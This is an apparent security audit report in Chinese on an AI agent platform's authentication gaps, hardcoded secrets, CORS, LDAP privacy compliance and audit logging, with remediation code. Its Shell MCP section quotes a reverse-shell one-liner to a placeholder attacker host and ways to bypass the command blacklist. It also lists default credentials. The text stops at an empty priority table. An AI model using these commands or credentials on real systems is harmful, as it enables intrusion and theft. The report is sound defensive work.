# IPA Platform 安全治理與合規深度分析報告

> **分析角色**: Security Architect（資深安全架構師）
> **分析日期**: 2026-02-21
> **分析對象**: IPA Platform 全面深度分析報告 V2 + 源碼交叉驗證
> **分析方法**: 報告審閱 + 源碼級安全驗證 + 攻擊面建模 + 合規差距分析

---

## 目錄

1. [報告概述評估：同意與不同意](#一報告概述評估同意與不同意)
2. [Auth 7% 覆蓋率深度分析與修復策略](#二auth-7-覆蓋率深度分析與修復策略)
3. [Shell/SSH MCP 無認證暴露攻擊面分析](#三shellssh-mcp-無認證暴露攻擊面分析)
4. [JWT Secret 硬編碼修復方案](#四jwt-secret-硬編碼修復方案)
5. [CORS 配置問題修復](#五cors-配置問題修復)
6. [LDAP MCP PDPO/GDPR 合規分析](#六ldap-mcp-pdpogdpr-合規分析)
7. [InMemoryAuditStorage 對合規的影響](#七inmemoryauditstorage-對合規的影響)
8. [28 Permission Patterns 運行時驗證](#八28-permission-patterns-運行時驗證)
9. [報告遺漏的安全問題](#九報告遺漏的安全問題)
10. [Top 10 安全修復優先級清單](#十top-10-安全修復優先級清單)
11. [ISO 27001 / SOC 2 / PDPO 合規差距矩陣](#十一iso-27001--soc-2--pdpo-合規差距矩陣)

---

## 一、報告概述評估：同意與不同意

### 1.1 完全同意的評估

| # | 報告結論 | 源碼驗證結果 | 同意理由 |
|---|---------|-------------|---------|
| 1 | 安全治理評分 1/10 | 已驗證 | 多個致命安全缺陷共存，詳見下文分析 |
| 2 | Auth 覆蓋率 7% (38/534) | **已驗證**：僅 `auth/routes.py`、`files/routes.py`、`sessions/routes.py` 3 個路由模組使用 `get_current_user` | 36/39 路由模組完全無認證保護 |
| 3 | JWT Secret 硬編碼 | **已驗證**：`config.py:29` 和 `config.py:131` 均為 `"change-this-to-a-secure-random-string"` | 且有兩處獨立的硬編碼（`secret_key` 和 `jwt_secret_key`），增加了遺漏修復的風險 |
| 4 | CORS origin 不匹配 | **已驗證**：`config.py:138` 配置 `http://localhost:3000,http://localhost:8000`，但 Frontend 在 port 3005 | 且 `allow_methods=["*"]` 和 `allow_headers=["*"]` 是過度寬鬆的 |
| 5 | 無 HTTP Rate Limiting | **已驗證**：全局搜索未發現 `slowapi` 或任何 HTTP middleware 層級的速率限制 | Claude SDK Hook 中有 `rate_limit.py` 但僅針對 LLM API 調用，非 HTTP 端點 |
| 6 | Shell/SSH MCP 無認證暴露 | **已驗證**：MCP servers 目錄中無 `check_permission` 調用 | 報告的評估完全正確 |
| 7 | InMemoryApprovalStorage 為預設 | **已驗證**：`controller.py:743` — `storage=storage or InMemoryApprovalStorage()` | 重啟即丟失所有待審批請求 |
| 8 | authStore 含 console.log | **已驗證**：5 處 console.log，包括登入成功、註冊成功、登出、session 刷新等 | 但實際風險比報告描述的更嚴重（見不同意項） |

### 1.2 部分不同意或需修正的評估

| # | 報告結論 | 源碼驗證結果 | 修正意見 |
|---|---------|-------------|---------|
| 1 | 「authStore 的 5 個 console.log 洩漏 auth token」 | **部分不同意**：實際 console.log 輸出的是 `user.email` 而非 token 本身 | 風險不是 token 洩漏，而是 **PII 洩漏**（用戶 email 暴露在瀏覽器 console）和 **操作行為追蹤**（攻擊者可從 console 得知認證事件時間線）。雖然嚴重性略低於 token 洩漏，仍需修復 |
| 2 | Sessions 模組的 auth | 報告將 sessions 算作有 auth 的模組之一 | **需修正**：`sessions/routes.py:93-103` 和 `sessions/chat.py:217-219` 的 `get_current_user_id()` 返回硬編碼 UUID `"00000000-0000-0000-0000-000000000001"`——這是**偽認證**，實際上沒有任何身份驗證。真正有認證的只有 `auth/` 和 `files/` 兩個模組，實際覆蓋率可能低於 7% |
| 3 | 報告的 error_type 洩漏問題 | 報告未提及 | `main.py:158` 的全局異常處理器在所有環境（包括 production）都返回 `error_type: type(exc).__name__`，這會洩漏內部實現細節（如 `SQLAlchemyError`、`KeyError` 等），有助於攻擊者進行目標偵察 |

### 1.3 報告嚴重性被低估的問題

| # | 問題 | 報告評估 | 我的評估 | 理由 |
|---|------|---------|---------|------|
| 1 | MCP Permission 未在運行時檢查 | 提出疑問但未確認 | **CRITICAL** | 已驗證：28 個 permission patterns 完全未被 MCP servers 調用。這不是「可能未啟用」，而是**確定未啟用** |
| 2 | Docker 預設憑證 | MEDIUM | **HIGH** | `admin/admin123` 用於 n8n 和 Grafana——如果這些服務暴露在網路上，攻擊者可直接登入 |
| 3 | ContextSynchronizer 無鎖 | 技術債 | **HIGH (Security)** | 在多 Agent 並行場景下，競爭條件可能導致 Agent 讀取錯誤的上下文，包括其他用戶的敏感數據 |
| 4 | Sessions 偽認證 | 未特別標記 | **CRITICAL** | 所有 session/chat 端點使用同一個硬編碼 user ID，意味著所有用戶共享同一個身份——完全無多租戶隔離 |

---

## 二、Auth 7% 覆蓋率深度分析與修復策略

### 2.1 現狀詳細分析

**源碼驗證結果**：

```
有真實 Auth 的路由模組 (2/39):
├── auth/routes.py       → Depends(get_current_user) 用於 /me 端點
└── files/routes.py      → Depends(get_current_user_id) 用於所有 6 端點

有偽 Auth 的路由模組 (1/39):
└── sessions/            → get_current_user_id() 返回硬編碼 UUID
    ├── routes.py:93     → return "00000000-0000-0000-0000-000000000001"
    └── chat.py:217      → return "00000000-0000-0000-0000-000000000001"

使用 Optional Auth 的模組 (1/39):
└── ag_ui/dependencies.py → Depends(get_current_user_optional)
    → 未認證用戶也可以正常使用，只是 user 為 None

完全無 Auth 的路由模組 (35/39):
├── agents, workflows, executions, checkpoints, connectors
├── cache, triggers, prompts, audit, notifications
├── routing, templates, learning, devtools, dashboard
├── versioning, performance, concurrent, handoff
├── groupchat, planning, nested, code_interpreter
├── mcp, claude_sdk, hybrid (context, core, risk, switch)
├── sandbox, autonomous, memory, a2a, patrol
├── correlation, rootcause, orchestration (4 files)
└── swarm (2 files)
```

**Auth 基礎設施品質評估**：

已有的 `dependencies.py` 設計是**合格的**：
- `get_current_user` — 強制認證（JWT token 必須有效）
- `get_current_user_optional` — 可選認證
- `get_current_active_admin` — Admin 角色驗證
- `get_current_operator_or_admin` — Operator/Admin 角色驗證
- RBAC 三級角色：admin, operator, viewer

問題不在於 Auth 系統設計不良，而在於 **Auth 系統已存在但未被使用**。

### 2.2 修復策略：分層認證架構

**技術選型建議**：

| 方案 | 適用場景 | 推薦程度 | 理由 |
|------|---------|---------|------|
| **FastAPI Depends + 現有 JWT** | 短期修復 | P0 立即執行 | Auth 基礎設施已存在，只需在路由層注入 |
| **Azure AD (Entra ID) + OAuth 2.0** | RAPO 部署 | P1 中期 | RAPO 使用 Azure，Azure AD 是自然選擇 |
| **OAuth 2.0 + OIDC** | 企業級標準 | P2 長期 | 符合 ISO 27001 A.9 存取控制要求 |

**P0 短期修復方案（3-5 天）**：

```python
# 方案 1: 全局 Auth Middleware（推薦）
# backend/src/api/v1/__init__.py

from src.api.v1.dependencies import get_current_user

# 定義公開路由白名單
PUBLIC_ROUTES = {
    "/api/v1/auth/login",
    "/api/v1/auth/register",
    "/api/v1/auth/refresh",
    "/api/v1/health",
    "/docs",
    "/redoc",
    "/openapi.json",
}

# 在 main.py 添加全局 Auth Middleware
@app.middleware("http")
async def auth_middleware(request: Request, call_next):
    path = request.url.path

    # 跳過公開路由
    if path in PUBLIC_ROUTES or not path.startswith("/api/v1/"):
        return await call_next(request)

    # 驗證 JWT Token
    auth_header = request.headers.get("Authorization")
    if not auth_header or not auth_header.startswith("Bearer "):
        return JSONResponse(
            status_code=401,
            content={"detail": "Authentication required"},
            headers={"WWW-Authenticate": "Bearer"},
        )

    token = auth_header.split(" ")[1]
    try:
        payload = decode_token(token)
        request.state.user_id = payload.sub
        request.state.user_role = payload.role
    except ValueError:
        return JSONResponse(
            status_code=401,
            content={"detail": "Invalid or expired token"},
            headers={"WWW-Authenticate": "Bearer"},
        )

    return await call_next(request)
```

```python
# 方案 2: Router 級別注入（更精細但工作量更大）
# 為每個路由模組的 APIRouter 添加 dependencies

# 例如: backend/src/api/v1/agents/routes.py
from src.api.v1.dependencies import get_current_user

router = APIRouter(
    prefix="/agents",
    tags=["Agents"],
    dependencies=[Depends(get_current_user)],  # 全 Router 認證
)
```

**P1 Azure AD 整合方案（2-3 週）**：

```python
# backend/src/core/security/azure_ad.py
from fastapi import Depends, HTTPException
from fastapi.security import OAuth2AuthorizationCodeBearer
import httpx
from jose import jwt as jose_jwt

# Azure AD 配置
AZURE_AD_TENANT_ID = os.getenv("AZURE_AD_TENANT_ID")
AZURE_AD_CLIENT_ID = os.getenv("AZURE_AD_CLIENT_ID")
AZURE_AD_AUTHORITY = f"https://login.microsoftonline.com/{AZURE_AD_TENANT_ID}"
AZURE_AD_JWKS_URL = f"{AZURE_AD_AUTHORITY}/discovery/v2.0/keys"

oauth2_scheme = OAuth2AuthorizationCodeBearer(
    authorizationUrl=f"{AZURE_AD_AUTHORITY}/oauth2/v2.0/authorize",
    tokenUrl=f"{AZURE_AD_AUTHORITY}/oauth2/v2.0/token",
    scopes={"api://ipa-platform/.default": "API access"},
)

async def verify_azure_ad_token(token: str = Depends(oauth2_scheme)):
    """驗證 Azure AD JWT Token"""
    try:
        # 從 Azure AD JWKS endpoint 獲取公鑰
        async with httpx.AsyncClient() as client:
            jwks = await client.get(AZURE_AD_JWKS_URL)
            keys = jwks.json()["keys"]

        # 驗證 token
        payload = jose_jwt.decode(
            token,
            keys,
            algorithms=["RS256"],
            audience=AZURE_AD_CLIENT_ID,
            issuer=f"{AZURE_AD_AUTHORITY}/v2.0",
        )
        return payload
    except Exception as e:
        raise HTTPException(status_code=401, detail=f"Invalid Azure AD token: {e}")
```

**工作量估算**：

| 階段 | 任務 | 工作量 |
|------|------|--------|
| P0 | 全局 Auth Middleware | 1 天 |
| P0 | 修復 sessions 偽認證 | 1 天 |
| P0 | 公開路由白名單定義 | 0.5 天 |
| P0 | 測試 + 前端 Token 傳遞調整 | 1.5 天 |
| P1 | Azure AD 整合 | 5-7 天 |
| P1 | RBAC 與 Azure AD Group 映射 | 3-5 天 |
| P1 | SSO 前端整合 (MSAL) | 3-5 天 |

---

## 三、Shell/SSH MCP 無認證暴露攻擊面分析

### 3.1 攻擊面建模

**前提條件**：

- IPA Platform 部署在網路可達的環境中
- 534 個 API 端點中 93% 無認證保護
- MCP Shell/SSH Server 的 API 端點包含在無保護的 `mcp/routes.py` 中

**攻擊場景 1：直接命令注入（CRITICAL）**

```
攻擊路徑:
1. 偵察: 攻擊者發現 IPA Platform 的 /api/v1/mcp/ 端點（無認證）
2. 發現: 列出可用的 MCP Server → 發現 shell-mcp
3. 探測: 通過 MCP protocol 查詢 Shell Server 的可用工具
4. 執行: 調用 shell_execute 工具，嘗試執行命令
5. 權限: 命令以 IPA Platform 服務帳戶的權限執行

風險評估:
- 可能性: HIGH（只需知道 API 端點即可）
- 影響: CRITICAL（完全控制伺服器）
- CVSS 基礎分: 9.8 (Critical)
  AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

**緩解因素分析**：

Shell 執行器 (`executor.py`) 確實有以下保護：

| 保護機制 | 有效性 | 繞過難度 |
|---------|--------|---------|
| 命令黑名單 (`rm -rf /`, `shutdown` 等) | 低 | 易繞過：使用 `find / -delete`、`python -c "import os; os.system('...')"` 等替代命令 |
| 正則模式封鎖 | 中 | 可繞過：編碼、別名、符號連結等手法 |
| 超時控制 (60s) | 低 | 反向 shell 不需要長時間：`bash -i >& /dev/tcp/attacker/port 0>&1` |
| 輸出大小限制 (1MB) | 無安全價值 | 僅防止記憶體耗盡，不防止命令執行 |

**攻擊場景 2：SSH 跳板攻擊（CRITICAL）**

```
攻擊路徑:
1. 通過 Shell MCP 或 SSH MCP 獲得初始訪問
2. SSH Config 的 allowed_hosts 預設為空（= 所有主機都允許）
3. 利用 IPA Platform 作為跳板，SSH 到內部網路中的其他主機
4. 橫向移動到 Database server、AD server 等敏感系統

風險評估:
- SSH Config 的 auto_add_host_keys 預設 False（好的預設值）
- 但 allowed_hosts 預設為空 list（壞的預設值 — 應預設拒絕所有）
- 如果 SSH private key 配置在服務器上，攻擊面更大
```

**攻擊場景 3：LDAP 數據竊取（HIGH）**

```
攻擊路徑:
1. 通過 MCP API 連接 LDAP Server（LDAP 憑證可能在配置中）
2. 執行 ldap_search_users 查詢所有用戶
3. 獲取 PII：姓名、郵箱、部門、職位、電話號碼
4. 用於社交工程攻擊或身份冒充

風險:
- LDAP 查詢結果未做任何脫敏處理
- 沒有查詢結果筆數限制（可一次取出所有用戶）
- 違反 PDPO 和 GDPR 的數據最小化原則
```

### 3.2 修復方案

**立即措施（P0, 1 天）**：

```python
# 1. 所有 MCP 端點必須通過認證 + 角色驗證
# backend/src/api/v1/mcp/routes.py

from src.api.v1.dependencies import get_current_operator_or_admin

router = APIRouter(
    prefix="/mcp",
    tags=["MCP"],
    dependencies=[Depends(get_current_operator_or_admin)],  # 至少 operator 角色
)
```

**短期措施（P1, 1 週）**：

```python
# 2. Shell 命令白名單機制（取代黑名單）
# backend/src/integrations/mcp/servers/shell/executor.py

@dataclass
class ShellConfig:
    # 改為白名單模式：只允許明確列出的命令
    allowed_commands: List[str] = field(default_factory=lambda: [
        "ls", "cat", "grep", "find", "df", "du",
        "ps", "top", "netstat", "ping", "nslookup",
        "tail", "head", "wc", "date", "uptime",
    ])
    # 禁用所有未列出的命令
    strict_whitelist: bool = True
```

```python
# 3. SSH 預設拒絕所有主機
# backend/src/integrations/mcp/servers/ssh/client.py

@dataclass
class SSHConfig:
    # 改為預設拒絕所有
    allowed_hosts: List[str] = field(default_factory=list)

    def validate_host(self, hostname: str) -> bool:
        """白名單模式：只允許明確配置的主機"""
        if not self.allowed_hosts:
            raise ValueError(
                "SSH allowed_hosts is empty. "
                "Configure SSH_ALLOWED_HOSTS to enable SSH access."
            )
        return hostname in self.allowed_hosts
```

---

## 四、JWT Secret 硬編碼修復方案

### 4.1 現狀分析

**源碼驗證結果**：

```python
# backend/src/core/config.py
class Settings(BaseSettings):
    secret_key: str = "change-this-to-a-secure-random-string"     # Line 29
    jwt_secret_key: str = "change-this-to-a-secure-random-string" # Line 131

# backend/src/domain/sessions/files/generator.py
class SecureDownloadURLGenerator:
    secret_key: str = "default-secret-key"  # Line 82
```

**風險等級**: CRITICAL

三處硬編碼秘鑰，其中兩處使用相同的預設值。任何能讀取源碼的人都可以：

1. 偽造任意用戶的 JWT Token
2. 以任何角色（包括 admin）調用 API
3. 偽造文件下載 URL Token

### 4.2 修復方案

**立即修復（P0, 2 小時）**：

```python
# backend/src/core/config.py — 移除所有硬編碼預設值

class Settings(BaseSettings):
    # 移除預設值，強制要求從環境變數或 .env 文件提供
    secret_key: str = Field(
        ...,  # 必填，無預設值
        description="Application secret key — MUST be set via environment variable",
    )
    jwt_secret_key: str = Field(
        ...,  # 必填，無預設值
        description="JWT signing secret — MUST be set via environment variable",
    )

    @field_validator("secret_key", "jwt_secret_key")
    @classmethod
    def validate_secret_not_default(cls, v: str) -> str:
        """拒絕不安全的預設秘鑰"""
        insecure_values = {
            "change-this-to-a-secure-random-string",
            "default-secret-key",
            "secret",
            "password",
        }
        if v.lower() in insecure_values or len(v) < 32:
            raise ValueError(
                "Secret key is insecure. "
                "Generate a strong key: python -c \"import secrets; print(secrets.token_hex(32))\""
            )
        return v
```

```bash
# .env 文件配置
# 使用以下命令生成安全秘鑰:
# python -c "import secrets; print(secrets.token_hex(32))"

SECRET_KEY=a1b2c3d4...（64 字符 hex）
JWT_SECRET_KEY=e5f6g7h8...（64 字符 hex，與 SECRET_KEY 不同）
```

**中期修復（P1, Azure Key Vault, 3-5 天）**：

```python
# backend/src/core/config.py — Azure Key Vault 整合

from azure.identity import DefaultAzureCredential
from azure.keyvault.secrets import SecretClient

class Settings(BaseSettings):
    # Azure Key Vault 配置
    azure_key_vault_url: str = ""

    @property
    def jwt_secret_from_vault(self) -> str:
        """從 Azure Key Vault 取得 JWT Secret"""
        if not self.azure_key_vault_url:
            return self.jwt_secret_key  # 回退到環境變數

        credential = DefaultAzureCredential()
        client = SecretClient(
            vault_url=self.azure_key_vault_url,
            credential=credential,
        )
        return client.get_secret("jwt-secret-key").value
```

**工作量估算**：

| 任務 | 工作量 |
|------|--------|
| 移除硬編碼預設值 + 添加驗證器 | 2 小時 |
| 更新 .env.example 和文件 | 1 小時 |
| 修復 SecureDownloadURLGenerator | 1 小時 |
| Azure Key Vault 整合 | 3-5 天 |
| 秘鑰輪換機制 | 2-3 天 |

---

## 五、CORS 配置問題修復

### 5.1 現狀分析

**源碼驗證結果**：

```python
# backend/src/core/config.py:138
cors_origins: str = "http://localhost:3000,http://localhost:8000"
# → 允許的 origin: 3000 和 8000
# → Frontend 實際在: 3005
# → 結果: 前端無法發送跨域請求（除非 Vite proxy 生效）

# backend/main.py:137-144
app.add_middleware(
    CORSMiddleware,
    allow_origins=settings.cors_origins_list,
    allow_credentials=True,
    allow_methods=["*"],    # 允許所有 HTTP 方法（含 DELETE, PATCH）
    allow_headers=["*"],    # 允許所有 Header（含自定義 Header）
)

# frontend/vite.config.ts:29-33
proxy: {
    '/api': {
        target: 'http://localhost:8010',  # 指向 8010
        changeOrigin: true,
    },
},
# → Vite proxy 指向 8010，但 Backend 在 8000
```

**三重端口不匹配**：

```
Frontend (3005) → Vite Proxy (目標 8010) → ??? → Backend (8000)
                       ↑                      ↑
                  端口 8010 無人監聽      CORS 允許 3000 不是 3005
```

**風險等級**: HIGH（功能性完全斷裂 + 安全配置過於寬鬆）

### 5.2 修復方案

**立即修復（P0, 30 分鐘）**：

```python
# backend/src/core/config.py
cors_origins: str = "http://localhost:3005"  # 修復: 改為 Frontend 實際端口

# 或更好的做法：完全由環境變數控制
# .env
CORS_ORIGINS=http://localhost:3005
```

```typescript
// frontend/vite.config.ts
proxy: {
    '/api': {
        target: 'http://localhost:8000',  // 修復: 改為 Backend 實際端口
        changeOrigin: true,
    },
},
```

```python
# backend/main.py — 收緊 CORS 配置
app.add_middleware(
    CORSMiddleware,
    allow_origins=settings.cors_origins_list,
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"],
    allow_headers=[
        "Authorization",
        "Content-Type",
        "X-Request-ID",
        "X-Guest-Id",
    ],
    expose_headers=["X-Request-ID"],
    max_age=600,  # Preflight 快取 10 分鐘
)
```

**生產環境配置**：

```bash
# .env.production
CORS_ORIGINS=https://ipa.rapo.ricoh.com  # 只允許正式域名
```

---

## 六、LDAP MCP PDPO/GDPR 合規分析

### 6.1 現狀分析

**LDAP 工具能力**（源碼驗證：`ldap/tools.py`）：

| 工具 | 操作 | 權限級別 | PII 風險 |
|------|------|---------|---------|
| `ldap_connect` | 連接 LDAP Server | EXECUTE (2) | 低 |
| `ldap_search` | 通用 LDAP 搜索 | READ (1) | **CRITICAL** — 可搜索任意 LDAP 屬性 |
| `ldap_search_users` | 搜索用戶 | READ (1) | **CRITICAL** — 返回 givenName, sn, mail, department, title |
| `ldap_search_groups` | 搜索群組 | READ (1) | MEDIUM — 群組成員資格 |
| `ldap_get_entry` | 取得單一條目 | READ (1) | **HIGH** — 可取得完整用戶記錄 |
| `ldap_disconnect` | 斷開連接 | READ (1) | 無 |

**關鍵問題**：

1. **無查詢結果筆數限制**：`ldap_search_users` 可一次返回所有 AD 用戶
2. **無欄位篩選/脫敏**：返回 LDAP 伺服器回傳的所有屬性
3. **無資料存取記錄**：因為 AuditLogger 預設用 InMemoryAuditStorage
4. **Permission 檢查未啟用**：`PERMISSION_LEVELS` 有定義但未被調用

### 6.2 PDPO 合規差距

| PDPO 原則 | 要求 | 現狀 | 差距 |
|-----------|------|------|------|
| **DPP1 — 數據收集目的** | 收集個人數據前須明確告知目的 | LDAP 查詢無目的聲明，Agent 可任意查詢 | CRITICAL |
| **DPP2 — 數據準確性** | 確保數據準確且及時更新 | AD 數據由 IT 維護，此處不適用 | 合規 |
| **DPP3 — 數據使用** | 只能用於收集時聲明的目的 | 無使用限制機制，Agent 可將 LDAP 數據用於任何目的 | HIGH |
| **DPP4 — 數據安全** | 採取適當措施保護數據 | 無認證、無加密傳輸確認、審計記錄為 InMemory | CRITICAL |
| **DPP5 — 公開性** | 公開數據政策和使用方式 | 無數據政策文件 | MEDIUM |
| **DPP6 — 數據存取** | 數據主體有權存取和更正自己的數據 | 無此機制 | MEDIUM |

### 6.3 修復方案

```python
# 1. LDAP 查詢結果脫敏
# backend/src/integrations/mcp/servers/ldap/tools.py

# 定義允許返回的欄位白名單
ALLOWED_USER_ATTRIBUTES = [
    "cn",           # Common Name（可返回）
    "department",   # 部門（可返回）
    "title",        # 職位（可返回）
    "memberOf",     # 群組成員資格（可返回）
]

SENSITIVE_ATTRIBUTES = [
    "mail",           # Email → 脫敏為 j***@ricoh.com
    "telephoneNumber", # 電話 → 脫敏為 ****1234
    "employeeID",     # 員工編號 → 不返回
    "homeDirectory",  # 主目錄 → 不返回
]

def sanitize_ldap_result(entry: dict, purpose: str) -> dict:
    """根據查詢目的脫敏 LDAP 結果"""
    sanitized = {}
    for key, value in entry.items():
        if key in SENSITIVE_ATTRIBUTES:
            sanitized[key] = mask_value(key, value)
        elif key in ALLOWED_USER_ATTRIBUTES:
            sanitized[key] = value
        # 未列出的屬性不返回

    # 記錄存取日誌
    logger.info(f"LDAP data access: purpose={purpose}, fields={list(sanitized.keys())}")
    return sanitized
```

```python
# 2. 查詢結果筆數限制
LDAP_MAX_RESULTS = 50  # 單次查詢最多返回 50 筆

# 3. 必須聲明查詢目的
class LDAPSearchRequest:
    query: str
    purpose: str  # 必填：為什麼需要這些數據
    max_results: int = Field(default=50, le=100)
```

**工作量估算**: 3-5 天

---

## 七、InMemoryAuditStorage 對合規的影響

### 7.1 現狀分析

**源碼驗證結果**：

```python
# backend/src/integrations/mcp/security/audit.py:448
class AuditLogger:
    def __init__(self, storage=None, ...):
        self._storage = storage or InMemoryAuditStorage()
        # → 預設值為 InMemory
        # → 服務重啟後所有審計記錄消失
```

**受影響的審計範圍**：

| 審計事件類型 | 數量 | 影響 |
|-------------|------|------|
| `TOOL_EXECUTION` | 所有 MCP 工具調用 | Shell 命令執行記錄丟失 |
| `ACCESS_GRANTED/DENIED` | 所有權限檢查結果 | 存取控制審計斷裂 |
| `CONFIG_CHANGE` | MCP Server 配置變更 | 變更追溯不可能 |
| `POLICY_CHANGE` | 權限策略變更 | 安全策略變更無法追蹤 |

### 7.2 合規影響分析

| 合規要求 | 標準條款 | 影響 |
|---------|---------|------|
| **ISO 27001 A.12.4** | 事件日誌記錄 | **不合規**: 日誌不持久 |
| **ISO 27001 A.12.4.2** | 保護日誌信息 | **不合規**: InMemory 無法防篡改 |
| **ISO 27001 A.12.4.3** | 管理員和操作員日誌 | **不合規**: 重啟後丟失 |
| **SOC 2 CC7.2** | 監控系統組件 | **不合規**: 審計軌跡不持久 |
| **SOC 2 CC7.3** | 評估安全事件 | **不合規**: 無法回溯分析 |
| **PDPO DPP4** | 數據安全措施 | **不合規**: 無法證明數據存取被追蹤 |

### 7.3 修復方案

```python
# backend/src/integrations/mcp/security/audit.py — 新增 PostgreSQL 存儲

class PostgreSQLAuditStorage(AuditStorage):
    """持久化審計存儲 — 使用 PostgreSQL"""

    def __init__(self, session_factory):
        self._session_factory = session_factory

    async def store(self, event: AuditEvent) -> None:
        """存儲審計事件到 PostgreSQL"""
        async with self._session_factory() as session:
            record = AuditRecord(
                event_id=event.event_id,
                event_type=event.event_type.value,
                timestamp=event.timestamp,
                user_id=event.user_id,
                server=event.server,
                tool=event.tool,
                arguments=json.dumps(self._sanitize_arguments(event.arguments)),
                result=event.result,
                status=event.status,
                metadata=json.dumps(event.metadata),
            )
            session.add(record)
            await session.commit()

    def _sanitize_arguments(self, arguments: dict) -> dict:
        """脫敏敏感參數（如密碼）"""
        sanitized = {}
        sensitive_keys = {"password", "secret", "token", "key", "credential"}
        for k, v in (arguments or {}).items():
            if any(s in k.lower() for s in sensitive_keys):
                sanitized[k] = "***REDACTED***"
            else:
                sanitized[k] = v
        return sanitized
```

```python
# 同時需要新增 Alembic migration
# backend/alembic/versions/xxx_add_audit_table.py

def upgrade():
    op.create_table(
        "audit_events",
        sa.Column("id", sa.String(36), primary_key=True),
        sa.Column("event_type", sa.String(50), nullable=False, index=True),
        sa.Column("timestamp", sa.DateTime, nullable=False, index=True),
        sa.Column("user_id", sa.String(100), index=True),
        sa.Column("server", sa.String(100)),
        sa.Column("tool", sa.String(100)),
        sa.Column("arguments", sa.Text),
        sa.Column("result", sa.Text),
        sa.Column("status", sa.String(20)),
        sa.Column("metadata", sa.Text),
    )
    # 審計表不允許 UPDATE 或 DELETE（append-only）
    op.execute("""
        CREATE OR REPLACE FUNCTION prevent_audit_modification()
        RETURNS TRIGGER AS $$
        BEGIN
            RAISE EXCEPTION 'Audit records cannot be modified or deleted';
        END;
        $$ LANGUAGE plpgsql;

        CREATE TRIGGER audit_immutable
        BEFORE UPDATE OR DELETE ON audit_events
        FOR EACH ROW EXECUTE FUNCTION prevent_audit_modification();
    """)
```

**工作量估算**: 3-5 天（含 DB migration + 測試 + 數據保留策略）

---

## 八、28 Permission Patterns 運行時驗證

### 8.1 驗證結果

**結論**: 28 個 Permission Patterns 在運行時**完全未被調用**。

**驗證方法**：

```
搜索範圍: backend/src/integrations/mcp/servers/ (所有 5 個 MCP Server)
搜索關鍵字: permission_manager, check_permission, PermissionManager
結果: 0 matches

搜索範圍: backend/src/integrations/mcp/ (整個 MCP 模組)
結果: 只在 __init__.py 的 export 列表和 security/permissions.py 的定義中出現
      在 core/、registry/、servers/ 中均無調用
```

**分析**：

`PermissionManager` 是一個設計完整的 RBAC 系統（458 LOC），支持：
- 基於角色的權限策略
- 用戶級別的權限分配
- glob 模式匹配（如 `dev-*`, `read_*`）
- 優先級排序的策略評估
- 動態條件（時間範圍、IP 白名單）
- 明確拒絕名單

但這個系統**從未被整合到 MCP 調用流程中**。

### 8.2 修復方案

```python
# backend/src/integrations/mcp/core/protocol.py
# 在 MCPProtocol 的 tools/call 處理中加入權限檢查

class MCPProtocol:
    def __init__(self, ..., permission_manager: PermissionManager = None):
        self._permission_manager = permission_manager

    async def handle_tool_call(self, request: MCPRequest) -> MCPResponse:
        server = request.params.get("server", "")
        tool = request.params.get("tool", "")
        user_id = request.context.get("user_id")
        roles = request.context.get("roles", [])

        # 權限檢查
        if self._permission_manager:
            allowed = self._permission_manager.check_permission(
                user_id=user_id,
                roles=roles,
                server=server,
                tool=tool,
                level=PermissionLevel.EXECUTE,
            )
            if not allowed:
                return MCPResponse(
                    error={"code": -32600, "message": "Permission denied"},
                )

        # 審計記錄
        await self._audit_logger.log(AuditEvent(
            event_type=AuditEventType.TOOL_EXECUTION,
            user_id=user_id,
            server=server,
            tool=tool,
        ))

        # 執行工具
        return await self._execute_tool(request)
```

**工作量估算**: 2-3 天

---

## 九、報告遺漏的安全問題

### 9.1 Sessions 偽認證（CRITICAL — 報告未提及）

**位置**: `backend/src/api/v1/sessions/routes.py:93-103`, `backend/src/api/v1/sessions/chat.py:217-219`

```python
async def get_current_user_id() -> str:
    """獲取當前用戶 ID"""
    return "00000000-0000-0000-0000-000000000001"
```

**影響**: 所有通過 Sessions API 的操作（聊天、工具調用、審批）都使用同一個用戶身份。這意味著：
- 無法區分不同用戶的操作
- 審計日誌無意義（所有操作歸屬於同一個假用戶）
- 多租戶隔離完全不存在

### 9.2 全局異常處理器洩漏 error_type（MEDIUM — 報告未提及）

**位置**: `backend/main.py:154-161`

```python
return JSONResponse(
    status_code=500,
    content={
        "detail": "Internal Server Error",
        "error_type": type(exc).__name__,  # 所有環境都暴露
        "message": str(exc) if settings.app_env == "development" else None,
    }
)
```

`error_type` 在生產環境中仍然暴露，洩漏了：
- 使用的數據庫驅動（`SQLAlchemyError`）
- 程式語言和框架信息（`KeyError`, `ValidationError`）
- 第三方庫版本線索

### 9.3 Docker 預設憑證未使用 Secrets（HIGH — 報告僅簡略提及）

**位置**: `docker-compose.override.yml:17-18, 88-89`

```yaml
N8N_BASIC_AUTH_USER=admin
N8N_BASIC_AUTH_PASSWORD=admin123
GF_SECURITY_ADMIN_USER=admin
GF_SECURITY_ADMIN_PASSWORD=admin123
```

且 `docker-compose.yml` 中其他密碼也使用環境變數預設值：
- PostgreSQL: `ipa_password`
- Redis: `redis_password`
- RabbitMQ: `guest/guest`
- Grafana: `admin/admin`

### 9.4 Zustand 持久化存儲 Token（MEDIUM — 報告未提及）

**位置**: `frontend/src/store/authStore.ts`

authStore 使用 `persist` middleware 將 token 存儲在 localStorage：
- JWT Token 存在 localStorage 中容易受到 XSS 攻擊
- RefreshToken 也存在 localStorage 中
- 建議改用 httpOnly Cookie

### 9.5 SSE 端點無認證的信息洩漏風險（HIGH — 報告未提及）

AG-UI SSE 端點 (`ag_ui/routes.py`) 使用 `get_current_user_optional`，意味著未認證用戶可以：
- 訂閱 SSE 事件流
- 觀察 Agent 的執行過程、工具調用、思考鏈
- 獲取其他用戶的操作結果

### 9.6 ContextSynchronizer 的安全維度（HIGH — 報告僅作為技術債提及）

兩個 ContextSynchronizer 均無鎖（已驗證），在多 Agent 並行場景下：
- Agent A 的上下文可能被 Agent B 讀取（跨會話信息洩漏）
- 風險評估結果可能被覆蓋（繞過 HITL 審批）

### 9.7 `reload=True` 在生產環境的安全風險（MEDIUM — 報告提及但未強調安全面向）

`main.py:242` 硬編碼 `reload=True`：
- 在生產環境中，任何可以修改服務器文件的攻擊者都能觸發代碼重載
- 與 Shell MCP 結合：攻擊者可以修改 Python 源碼 → 自動重載 → 執行任意代碼

---

## 十、Top 10 安全修復優先級清單

| 優先級 | 問題 | CVSS 分 | 修復方案 | 工作量 | 前置依賴 |
|--------|------|---------|---------|--------|---------|
